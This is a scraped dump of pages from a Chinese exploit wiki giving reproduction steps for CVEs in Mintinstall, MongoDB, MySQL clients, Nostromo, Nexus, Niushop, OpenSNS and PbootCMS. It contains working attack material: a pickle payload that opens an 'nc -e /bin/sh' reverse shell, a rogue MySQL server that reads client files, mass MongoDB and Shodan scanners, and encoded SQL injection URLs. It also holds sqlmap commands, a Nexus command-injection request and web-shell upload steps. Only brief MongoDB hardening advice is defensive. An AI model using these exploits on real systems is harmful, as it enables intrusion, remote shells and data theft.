window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mintinstall/1.html":{"url":"0day/Mintinstall/1.html","title":"（CVE-2019-17080）Mintinstall object injection","keywords":"","body":"（CVE-2019-17080）Mintinstall object injection 一、漏洞简介 Linux mint软件管理器（v 7.9.5 / 9）由于配置错误而导致对象注入和任意代码执行。 Linux Mint Software Manager（v 7.9.5 / 9）由于配置错误而导致我们执行对象注入和任意代码 二、漏洞影响 Version: 7.9.9 三、复现过程 mintinsall 我们运行Mint软件管理器还会检查是否有新注释，如果new-reviews.list 下载中有 新注释并写入文件。 如果有新评论，请从文件new-reviews.list下载并写入文件 code mintinstall.py 首次启动软件管理器时，它会从评论模块调用ReviewCache（）类。 它如何处理数据？ code reviews.py 当ReviewCache类启动（init）时，它将调用_load_cache（）函数。 加载缓存功能读取REVIEWS_CACHE变量中的文件，并在pickle模块的帮助下，对文件中的数据进行反序列化并在内存中保存一些值 当我检查文件时，看起来好像可以写文件。 Pickle 因为我们可以使用模块执行序列化/反序列化操作，所以可以包含模块并使用reduce方法执行任意代码。 如果您尝试反序列化文件，则我们的恶意代码将起作用。 cos system (S'nc -e /bin/sh 192.168.2.138 4545' tR. >>modül adı c{os} >> fonksiyon ( >> işaretleyici nesnesi S >> tırnak sonuna kadar okuyup stack'e at tR. >> stackte olanları çagır ve sonucu stacke yerleştir. poc import os import sys def shellCode(payload): with open(f\"{os.getenv('HOME')}/.cache/mintinstall/reviews.cache\",\"w\") as wb: wb.write(payload) print(\"[+] Start mintinstall\") if __name__==\"__main__\": shellCode(f\"\"\"cos\\nsystem\\n(S\"nc -e /bin/sh {sys.argv[1]} {sys.argv[2]}\"\\ntR.\"\"\") else: print(\"[!] exploit.py [IP] [PORT]\") 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 16:50:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MongoDB/1.html":{"url":"0day/MongoDB/1.html","title":"MongoDB未授权访问","keywords":"","body":"MongoDB未授权访问 一、漏洞简介 MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。 使用默认 mongod 命令启动 Mongodb 机器可以被公网访问 在公网上开放了 Mongodb 端口 数据库隐私泄露 数据库被清空 数据库运行缓慢 二、影响范围 三、复现过程 1. 扫描探测 2. 下载： http://nmap.org/svn/scripts/mongodb-info.nse nmap -p 27017 --script mongodb-info vim /etc/mongodb.conf dbpath = /data/ logpath = /var/logs/mongodb.log ##port = 27017 ##fork = true bind_ip = 0.0.0.0 ./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf 1.1 基础 https://www.jianshu.com/p/8bf26effa737 http://www.runoob.com/mongodb/mongodb-tutorial.html https://itbilu.com/database/mongo/E1tWQz4_e.html 1.2 批量扫描未授权 import socket import sys import pymongo ipcons = [] def Scanner(ip): global ipcons sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sk.settimeout(0.3) try: sk.connect((ip,27017)) ipcons.append(ip) sk.close() except Exception: pass def ip2num(ip): ip=[int(x) for x in ip.split('.')] return ip[0] >24, (num & 0x00ff0000) >>16, (num & 0x0000ff00) >>8, num & 0x000000ff ) def get_ip(ip): start,end = [ip2num(x) for x in ip.split(' ') ] return [ num2ip(num) for num in range(start,end+1) if num & 0xff ] startIp = sys.argv[1] endIp = sys.argv[2] iplist = get_ip(sys.argv[1]+\" \"+sys.argv[2]) for i in iplist: Scanner(i) def connMon(ip_addr): print ' Connect mongodb: ' + ip_addr + ':27017' try: conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000) dbname = conn.database_names() print \"success\" except Exception as e: print \"error\" print ipcons for ipaddr in ipcons: connMon(ipaddr) print \"=================\" 1.3 shodan扫描脚本 ##!/usr/bin/python ## -*- coding: UTF-8 -*- ''' @Author：joy_nick @博客：http://byd.dropsec.xyz/ ''' import shodan import os iplist = [] ip_list = [] shodan_ip_list = [] def shodanSearch(keywords): SHODAN_API_KEY = \"your key\" api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results['total']) for result in results['matches']: ##iplist.append({\"ip\":result['ip_str'],\"country\":result['location']['country_name']}) iplist.append(result['ip_str']) for i in range(len(iplist)): ip_list = iplist[i].encode('utf-8') shodan_ip_list.append(ip_list) s = '\\n'.join(shodan_ip_list) with open('shodan_ip_list.txt','w') as output: output.write(s) except shodan.APIError, e: print 'Error: %s' % e if __name__ == '__main__': shodanSearch('redis') 查询操作 2. 爆破脚本 https://github.com/netxfly/x-crack 4. 防范措施 (1).新建管理账户开启MongoDB授权新建终端[参数默认可以不加，若有自定义参数，才要加上，下同] mongod --port 27017 --dbpath /data/db1 另起一个终端，运行下列命令 mongo --port 27017 use admin db.createUser( { user: \"adminUser\", pwd: \"adminPass\", roles: [ { role: \"userAdminAnyDatabase\", db: \"admin\" } ] } ) 管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass (2).本地访问bind 127.0.0.1 (3).修改默认端口修改默认的mongoDB端口(默认为: TCP 27017)为其他端口 (4).禁用HTTP和REST端口MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false(5).开启日志审计功能审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情(6).开启auth认证 /etc/mongodb.conf　　 auth = true 其他:http://www.mottoin.com/105609.html 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mysql/1.html":{"url":"0day/Mysql/1.html","title":"MySQL LOAD DATA 读取客户端任意文","keywords":"","body":"MySQL LOAD DATA 读取客户端任意文 一、漏洞简介 LOAD DATA INFILE mysql的LOAD DATA INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是： load data infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; load data local infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; 第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD DATA LOCAL INFILE。 官方文档中也提出了这个问题（PS：Google翻译的不是很准确） 二、漏洞影响 三、复现过程 分析数据包 测试环境： MacOS 10.14 Mysql 5.7.21 使用tcpdump抓取3306端口的数据包 1.服务器向客户端发送greeting问候包，包含服务端banner信息 2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。 3.然后是客户端初始化的一些查询，比如select database(); select @@version_comment; 4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que 5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。 6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容： 如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的 In theory, a patched server could be built that would tell the client program to transfer a file of the server's choosing rather than the file named by the client in the LOAD DATA statement. 也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 搭建MySQL服务端 主要分为 向 MySQL Client 发送Server Greeting 等待 Client 端发送一个Query Package 回复一个file transfer请求 我们需要知道如何构造File Transfer和Server Greeting数据包，这些包的格式都可以在 MySQL 的官方文档上找到。 File Transfer数据包格式：Protocol::LOCAL_INFILE_Request 并且我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求。不过我们在上面看到客户端在连接成功后会自动的做一些初始化的查询。 官方也给了exmaple 0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64 ...../etc/passwd 数据包的内容其实是从\\xfb开始的，这个字节代表包的类型，后面紧跟要读取的文件名。前面的0x0c是数据包的长度（从 \\xfb 开始计算），长度后面的三个字节\\x00\\x00\\x01是数据包的序号。 Greeting数据包格式：官方文档，如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。 这里直接拷贝大佬归纳的格式。 '\\x0a', # Protocol '6.6.6-lightless_Mysql_Server' + '\\0', # Version '\\x36\\x00\\x00\\x00', # Thread ID 'ABCDABCD' + '\\0', # Salt '\\xff\\xf7', # Capabilities, CLOSE SSL HERE! '\\x08', # Collation '\\x02\\x00', # Server Status \"\\x0f\\x80\\x15\", '\\0' * 10, # Unknown 'ABCDABCD' + '\\0', \"mysql_native_password\" + \"\\0\" poc 来源于https://www.vesiluoma.com/abusing-mysql-clients/的POC，测了一个多小时都没成功，最后发现里面 #3payload写错了，我给改了下。 #!/usr/bin/python #coding: utf8 import socket # linux : #filestring = \"/etc/passwd\" # windows: #filestring = \"C:\\Windows\\system32\\drivers\\etc\\hosts\" HOST = \"0.0.0.0\" # open for eeeeveryone! ^_^ PORT = 3306 BUFFER_SIZE = 1024 #1 Greeting greeting = \"\\x5b\\x00\\x00\\x00\\x0a\\x35\\x2e\\x36\\x2e\\x32\\x38\\x2d\\x30\\x75\\x62\\x75\\x6e\\x74\\x75\\x30\\x2e\\x31\\x34\\x2e\\x30\\x34\\x2e\\x31\\x00\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\" #2 Accept all authentications authok = \"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\" #3 Payload #数据包长度 payloadlen = \"\\x0c\" padding = \"\\x00\\x00\" payload = payloadlen + padding + \"\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((HOST, PORT)) s.listen(1) while True: conn, addr = s.accept() print 'Connection from:', addr conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print \" \".join(\"%02x\" % ord(i) for i in data) conn.send(authok) data = conn.recv(BUFFER_SIZE) conn.send(payload) print \"[*] Payload send!\" data = conn.recv(BUFFER_SIZE) if not data: break print \"Data received:\", data break # Don't leave the connection open. conn.close() ps: 实测 下面这个项目比较好用，上面的poc还需要改长度和内容的16进制值 Github还有一个项目：https://github.com/allyshka/Rogue-MySql-Server 该特性适用于：MySQL Client、 PHP with mysqli、Python with MySQLdb、Python3 with mysqlclient、Java with JDBC Driver等。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:40:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Newbee-mall/1.html":{"url":"0day/Newbee-mall/1.html","title":"CVE-2019-19113）新蜂商城sql注入","keywords":"","body":"（CVE-2019-19113）新蜂商城sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 \\src\\main\\resources\\mapper\\NewBeeMallGoodsMapper.xml select from tb_newbee_mall_goods_info and (goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%')) and goods_category_id = #{goodsCategoryId} order by goods_id desc order by selling_price asc order by stock_num desc limit #{start},#{limit} 如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险 poc： http://0-sec.org:28089/search?goodsCategoryId=&keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&orderBy=default 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-24 13:38:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nexus/1.html":{"url":"0day/Nexus/1.html","title":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞","keywords":"","body":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞 一、漏洞简介 该漏洞默认存在部署权限账号，成功登录后可使用“createrepo”或“mergerepo”自定义配置，可触发远程命令执行漏洞 二、漏洞影响 Nexus Repository Manager OSS 三、复现过程 首先以管理员身份（admin/admin123）登录 然后找到漏洞位置：Capabilities - Yum:Configuration - Settings 点击 Save 抓包，更改mergerepoPath后的value值 C:\\\\Windows\\\\System32\\\\cmd.exe /k dir& 此处使用 /k 是因为这样命令执行完会保留进程不退出，而 /c 后执行完会退出；由于给用户提供的命令后面加了一个 --version，所以后面要加个&，&表两个命令同时执行，这样就不会干扰其他命令的执行 Poc如下： PUT /nexus/service/siesta/capabilities/00012bdb034073a3 HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate X-Nexus-UI: true Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 241 DNT: 1 Connection: close Referer: http://127.0.0.1:8081/nexus/ Cookie: NXSESSIONID=105c7cb1-a307-43a3-9ff8-9770b5ae3b13 {\"typeId\":\"yum\",\"enabled\":true,\"properties\":[{\"key\":\"maxNumberParallelThreads\",\"value\":\"10\"},{\"key\":\"createrepoPath\",\"value\":\"111\"},{\"key\":\"mergerepoPath\",\"value\":\"C:\\\\Windows\\\\System32\\\\cmd.exe /k dir&\"}],\"id\":\"00012bdb034073a3\",\"notes\":\"\"} 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Niushop/1.html":{"url":"0day/Niushop/1.html","title":"Niushop sql注入","keywords":"","body":"Niushop sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 sql注入（一） order参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7%27&attr_array[][2]=8&spec_array[]=9 attr_array参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27&spec_array[]=9 直接上sqlmap sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" --current-db sql注入（二） GET /index.php?s=/wap/Goods/promotionZone&group_id=*&page=1 HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close 将数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql\" sql注入（三） POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 66 Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close Cache-Control: max-age=0 sear_name=&sear_type=1&order=*&sort=asc&controlType=&shop_id=0&page=1 数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql\" 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 18:03:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nostromo httpd/1.html":{"url":"0day/Nostromo httpd/1.html","title":"（CVE-2019-16278）命令执行","keywords":"","body":"（CVE-2019-16278）命令执行 一、漏洞简介 （CVE-2019-16278）命令执行 二、影响范围 三、复现过程 https://github.com/ianxtianxt/CVE-2019-16278/ ➜ Downloads python nostromo.py 114.114.114.114 8080 pwd /bin ➜ Downloads python nostromo.py 114.114.114.114 8080 id uid=65534 gid=65534 ➜ Downloads python nostromo.py 114.114.114.114 8080 \"ls -al\" drwxr-xr-x 2 0 0 0 Apr 12 2013 . drwxr-xr-x 16 0 0 0 Jan 1 1970 .. lrwxrwxrwx 1 0 0 7 Apr 12 2013 ash -> busybox 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 16:04:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nostromo httpd/2.html":{"url":"0day/Nostromo httpd/2.html","title":"（CVE-2019-16279）dos","keywords":"","body":"（CVE-2019-16279）dos 一、漏洞简介 （CVE-2019-16279）dos 二、影响范围 三、复现过程 This bug exploit a memory error when sending too many \\r\\n in a single connexion. Example $ curl http://127.0.0.1:8080 HELLO! $ ./CVE-2019-16279.sh 127.0.0.1 8080 $ curl http://127.0.0.1:8080 curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 16:05:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OpenSNS/1.html":{"url":"0day/OpenSNS/1.html","title":"OpenSNS sql注入","keywords":"","body":"OpenSNS sql注入 一、漏洞简介 OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是“ThinkOX”，2015年1月28号正式更名为OpenSNS。 OpenSNS采用PHP+MYSQL构建的一款有“身份”的开源免费SNS社交系统，适用于多种社会关系。 OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。 OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。 二、漏洞影响 三、复现过程 SQL注入(一) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --current-db 同类h注入点 http://0-sec.org/index.php?s=/ucenter/index/index&uid=10 http://0-sec.org/index.php?s=/ucenter/index/information&uid=10 SQL注入(二) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --current-db 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 14:42:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OpenSNS/2.html":{"url":"0day/OpenSNS/2.html","title":"OpenSNS 后台getshell","keywords":"","body":"OpenSNS 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 1. 打开网站后台找到模板上传位置： 2. 配置一个压缩包，压缩包里是一句话木马： 3. 选择上传： 4、会在./Theme目录下自动生成刚刚上传好的马尔 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 14:46:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/1.html":{"url":"0day/PbootCMS/1.html","title":"PbootCMS sql注入","keywords":"","body":"PbootCMS sql注入 0x01 前台home模块注入漏洞 0x01.1 在线留言处insert sql注入 0x01.1.2 漏洞演示 注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add post: contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 content = 1111 mobile = 1111 0x01.1.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\MessageController.php 方法：add( // 留言新增 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { // if (! $checkcode) { // alert_back('验证码不能为空！'); // } if ($checkcode != session('checkcode')) { alert_back('验证码错误！'); } } // 读取字段 if (! $form = $this->model->getFormField(1)) { alert_back('留言表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置额外数据 if ($data) { $data['acode'] = session('lg'); $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'guest'; $data['update_user'] = 'guest'; } if ($this->model->addMessage($data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('留言提交成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('留言提交失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php 方法：addMessage( // 新增留言 public function addMessage($data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x01.2 免费通话insert sql注入 注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可 进入后台 0x08.2.1 漏洞演示 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2 post： tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 0x08.2.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\FormController.php 方法：add( // 表单提交 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { * if (! $checkcode) { * alert_back('验证码不能为空！'); * } * if ($checkcode != session('checkcode')) { * alert_back('验证码错误！'); * } * } */ // 读取字段 if (! $form = $this->model->getFormField($fcode)) { alert_back('接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('提交表单数据失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm($value->table_name, $data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入. 0X01.3 前台首页注入 0x08.3.1 漏洞演示 url: 